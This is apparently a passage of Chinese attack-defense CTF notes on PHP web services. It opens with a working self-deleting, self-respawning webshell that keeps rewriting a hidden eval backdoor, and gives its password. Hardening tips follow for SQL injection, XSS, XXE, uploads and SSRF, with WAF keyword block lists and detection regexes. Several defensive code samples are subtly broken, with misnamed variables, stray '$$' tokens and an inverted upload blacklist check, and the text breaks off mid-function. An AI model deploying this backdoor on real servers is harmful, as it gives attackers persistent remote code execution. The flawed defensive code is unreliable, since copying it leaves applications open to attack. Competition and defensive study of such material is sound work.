<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;-index.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;56183c1f36ef08fb8b027a4116db8483&quot;)&#123;@eval($_POST[&quot;a&quot;]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//pass=lewiserii</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">        <span class="comment">//system(&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; -index.php&#x27;);</span></span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>删除只需要添加</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./</span><br><span class="line">例如</span><br><span class="line">rm -rf ./-index.php</span><br></pre></td></tr></table></figure>
<h2><span id="web服务加固"> web服务加固</span></h2>
<h3><span id="php"> php</span></h3>
<h4><span id="sql注入"> sql注入</span></h4>
<ul>
<li>预编译</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;db&#x27;</span>);</span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建预编译对象</span></span><br><span class="line"><span class="variable">$mysqli_stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;select name balance from account where id = ?&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//用户输入的参数</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定参数</span></span><br><span class="line"><span class="variable">$mysqli_stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;i&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行</span></span><br><span class="line"><span class="variable">$mysql_stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定结果集</span></span><br><span class="line"><span class="variable">$mysqli_stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$name</span>, <span class="variable">$balance</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果集</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$mysqli_stamt</span>-&gt;<span class="title function_ invoke__">fetch</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$name</span>--<span class="subst">$balance</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最佳的解决方式，预编译，但是不能防order by(业务需要，导致这个参数如果被预编译了就无法执行语句了)</p>
<p>对于预编译就上白名单即可</p>
<ul>
<li><code>addslashes</code>、<code>mysqli_real_escape_string</code></li>
</ul>
<p>其中<code>mysqli_real_escape_string</code>还能够防止宽字节注入</p>
<ul>
<li>php 5.4以下，禁用魔术引号(自动对外部来源数据进行转义，防止sql注入)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc=off</span><br></pre></td></tr></table></figure>
<ul>
<li>waf启动：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">filter</span> <span class="operator">=</span> &quot;regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|-&quot;; if((preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$username)<span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>) <span class="operator">||</span> (preg_match(&quot;/&quot;.$filter.&quot;/is&quot;,$password)<span class="operator">=</span><span class="operator">=</span> <span class="number">1</span>))&#123; die(); &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>记得关闭报错信息</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br></pre></td></tr></table></figure>
<h4><span id="xss"> xss</span></h4>
<ul>
<li>
<p>httponly</p>
</li>
<li>
<p>htmlspecialchars()转义函数：</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); <span class="variable">$name</span> = <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] ); <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>htmlspecialchars()能够将预定义的字符转换为html实体</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars(string,flags,character-set,double_encode) 其中第二个参数flags需要重要注意，很多开发者就是因为没有注意到这个参数导致使用htmlspecialchars()函数过滤XSS时被绕过。因为flags参数对于引号的编码如下： 可用的引号类型： </span><br><span class="line">ENT_COMPAT - 默认。仅编码双引号。 </span><br><span class="line">ENT_QUOTES - 编码双引号和单引号。 </span><br><span class="line">ENT_NOQUOTES - 不编码任何引号。 默认是只编码双引号的</span><br></pre></td></tr></table></figure>
<p>前端<code>js</code>修复：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">String</span> parameter = request.<span class="title function_">getParameter</span>(<span class="string">&quot;xss&quot;</span>);</span><br><span class="line">parameter = <span class="variable constant_">ESAPI</span>.<span class="title function_">encoder</span>().<span class="title function_">encodeForHTML</span>(parameter);</span><br><span class="line"><span class="comment">//owasp官方api进行html实体编码</span></span><br><span class="line">response.<span class="title function_">getWriter</span>().<span class="title function_">write</span>(<span class="string">&quot;&lt;body&gt;&quot;</span>+parameter+<span class="string">&quot;&lt;/body&gt;&quot;</span>);</span><br><span class="line">waf</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">wafxss</span>(<span class="params">$str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_">preg_match</span>(<span class="string">&quot;/\&#x27;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="xxe"> xxe</span></h4>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">　<span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<h4><span id="文件上传"> 文件上传</span></h4>
<ul>
<li>后端代码限制上传的文件类型和后缀大小：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;Up10defile&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(<span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;Up10defile&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;Up10defile&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))==<span class="string">&#x27;gif&#x27;</span>)&amp;&amp;(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>]&lt;<span class="number">1024000</span>)&#123; &#125; <span class="keyword">else</span>&#123; <span class="keyword">die</span>(); &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>检查文件后缀：</li>
</ul>
<p><code>php、php5、php4、php3、php2、phtml、pht、.htaccess、.user.ini</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;php2&quot;</span>,<span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;htaccess&quot;</span>, <span class="string">&quot;ini&quot;</span>, <span class="string">&quot;shtml&quot;</span>,<span class="string">&quot;php7&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$black</span>) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>]&gt;<span class="number">1024000</span>) )&#123;</span><br><span class="line">    <span class="variable">$fake</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;上传成功, 文件路径/uploads/<span class="subst">$fake</span>.<span class="subst">$extension</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>检查文件内容：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//接上文</span></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>][<span class="number">0</span>])&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|define|flag|exec|base64|eval|php|AddType|Files/i&quot;</span>,<span class="variable">$post</span>)) &#123;    <span class="keyword">echo</span> <span class="string">&quot;上传成功，审核通过后将会展示您的图片！&quot;</span>; <span class="keyword">exit</span>();</span><br><span class="line"> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>配置<code>.htaccess</code>：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">Directory</span> <span class="string">&quot;/var/www/html/upload&quot;</span>&gt;   <span class="comment">//指定目录后续的指令将应用于该目录</span></span><br><span class="line">Options -ExecCGI -Indexes            <span class="comment">//禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。</span></span><br><span class="line">AllowOverride None                   <span class="comment">//不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。</span></span><br><span class="line">RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml  </span><br><span class="line">RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml      </span><br><span class="line"><span class="comment">//这两个指令移除指定文件扩展名的处理器和类型。</span></span><br><span class="line"><span class="comment">//在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。</span></span><br><span class="line">php_flag engine off     <span class="comment">//这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。</span></span><br><span class="line">&lt;FilesMatch <span class="string">&quot;.+\.ph(p[3457]?|t|tml)$&quot;</span>&gt;</span><br><span class="line">deny <span class="keyword">from</span> all</span><br><span class="line">&lt;/FilesMatch&gt;  <span class="comment">//这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有</span></span><br><span class="line">&lt;/<span class="built_in">Directory</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>强制给上传的文件添加后缀名</strong>，在不存在文件包含漏洞的情况下，该方法能最有效的防御攻击者上传执行木马</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;Up10defile&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;Up10defile&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;Up10defile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">    <span class="string">&quot;upload_file/&quot;</span> .<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;Up10defile&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="title function_ invoke__">time</span>()).<span class="string">&quot;.gif&quot;</span>);</span><br><span class="line">    <span class="comment">#echo &quot;Stored in: &quot; . &quot;upload_file/&quot; . $_FILES[&quot;Up10defile&quot;][&quot;name&quot;].&quot;.gif&quot;;</span></span><br><span class="line">    <span class="comment">//玩点恶心的</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="string">&quot;upload_file/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;Up10defile&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="ssrf"> ssrf</span></h4>
<p>ssrf的修复方法如下：</p>
<ul>
<li>去除url中的特殊字符</li>
<li>判断是否属于内网ip</li>
<li>将请求时的域名改为ip</li>
<li>请求的url就变成了上面返回的url</li>
<li>请求的时候设置header里的host为ip</li>
<li>请求头，判断是否为30x的跳转</li>
</ul>
<p>第一步为了防止url parse造成的解析问题</p>
<p>第三步防止dns重定向</p>
<p>第五步防止ip请求的时候某些网站无法访问</p>
<p>最后一步防止通过跳转进行绕过</p>
<p>非必要不要从用户那里接受要访问的url，防止用户构造url进行穿透访问</p>
<p>修复：</p>
<ul>
<li>利用<code>open_basedir</code></li>
</ul>
<p>open_basedir限制用户的访问目录，可以有效防止<code>file_get_contents</code>、<code>curl</code>、<code>fopen</code>等函数对服务器的敏感文件的访问</p>
<p>上白名单：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">declare</span>(strict_types = <span class="number">1</span>);</span><br><span class="line"><span class="variable">$$url</span> = <span class="variable">$$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="comment">// 请求url信息</span></span><br><span class="line"><span class="variable">$$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$$url</span>);</span><br><span class="line"><span class="comment">// 限制请求协议，仅允许http和https请求，防止类似file:///、gopher://、ftp://等引起的安全问题</span></span><br><span class="line"><span class="variable">$validSchemeList</span> = [<span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;https&#x27;</span>];</span><br><span class="line"><span class="comment">// 限制允许请求到的地址</span></span><br><span class="line"><span class="variable">$validHostList</span> = [<span class="string">&#x27;www.baidu.com&#x27;</span>];</span><br><span class="line"><span class="comment">// 限制请求的端口为http常用的端口</span></span><br><span class="line"><span class="variable">$validPortList</span> = [<span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;443&#x27;</span>];</span><br><span class="line"><span class="comment">// 只允许用户访问特定的文件类型</span></span><br><span class="line"><span class="variable">$validTypeList</span> = [<span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>, <span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line"><span class="comment">// 不允许访问本地指定的host（避免被用来获取内网数据）</span></span><br><span class="line"><span class="variable">$invalidHostList</span> = [<span class="string">&#x27;127.&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;192.&#x27;</span>, <span class="string">&#x27;10.&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(</span><br><span class="line"><span class="variable">$urlInfo</span>[<span class="string">&#x27;scheme&#x27;</span>], $</span><br><span class="line">validSchemeList, <span class="literal">true</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;访问协议非法&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(</span><br><span class="line"><span class="variable">$urlInfo</span>[<span class="string">&#x27;port&#x27;</span>], $</span><br><span class="line">validPortList, <span class="literal">true</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;访问端口非法&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(</span><br><span class="line"><span class="variable">$urlInfo</span>[<span class="string">&#x27;host&#x27;</span>], $</span><br><span class="line">validHostList, <span class="literal">true</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请求地址非法&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$$visitType</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$$url</span>, PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(</span><br><span class="line"><span class="variable">$visitType</span>, $</span><br><span class="line">validTypeList, <span class="literal">true</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;访问类型非法&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (</span><br><span class="line"><span class="variable">$invalidHostList</span> <span class="keyword">as</span> $</span><br><span class="line">invalidHost) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(</span><br><span class="line"><span class="variable">$urlInfo</span>[<span class="string">&#x27;host&#x27;</span>], $</span><br><span class="line">invalidHost) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;访问地址非法&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">CURL_INIT</span>();</span><br><span class="line">    <span class="title function_ invoke__">CURL_SETOPT</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="title function_ invoke__">CURL_SETOPT</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="title function_ invoke__">CURL_SETOPT</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="comment">// 0.判断URL合法性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$url</span> || !<span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.仅允许http或https协议</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/.*$/&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.解析目标URL，获取其host</span></span><br><span class="line">        <span class="variable">$host</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$host</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.解析host，获取host指向的IP地址</span></span><br><span class="line">        <span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$host</span>);</span><br><span class="line">        <span class="variable">$ip</span> = <span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.检查IP地址是否为内网IP</span></span><br><span class="line">        <span class="variable">$is_inner_ipaddress</span> = <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == <span class="variable">$ip</span> &gt;&gt; <span class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="number">24</span> == <span class="variable">$ip</span> &gt;&gt; <span class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="number">20</span> == <span class="variable">$ip</span> &gt;&gt; <span class="number">20</span> <span class="keyword">or</span></span><br><span class="line">            <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="number">16</span> == <span class="variable">$ip</span> &gt;&gt; <span class="number">16</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$is_inner_ipaddress</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.请求URL</span></span><br><span class="line">        <span class="title function_ invoke__">CURL_SETOPT</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span 